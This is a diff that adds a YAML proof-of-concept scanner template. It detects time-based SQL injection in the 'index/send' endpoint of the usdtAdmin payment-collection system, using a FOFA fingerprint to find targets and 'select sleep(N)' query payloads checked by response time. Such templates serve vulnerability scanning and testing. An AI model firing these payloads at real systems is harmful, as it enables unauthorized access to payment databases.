@@ -1,0 +1,23 @@
+id: poc-yaml-usdtmerchant-send-query-sqli
+info:
+  name: usdtAdmin 收款管理系统 index/send存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: usdtAdmin网站管理系统
+  fofa: /usdtmerchant/login/reg.html
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: /index/index/send?query=select%20sleep({{.t1}})
+  expression: "status_code == 200 && \nbody == \"\" &&\nduration >= t1 &&\nduration\
+    \ <= t2\n"
+- method: GET
+  path: /index/index/send?query=select%20sleep({{.t3}})
+  expression: "status_code == 200 && \nbody == \"\" &&\nduration >= t3 &&\nduration\
+    \ <= t4\n"
+transport: http
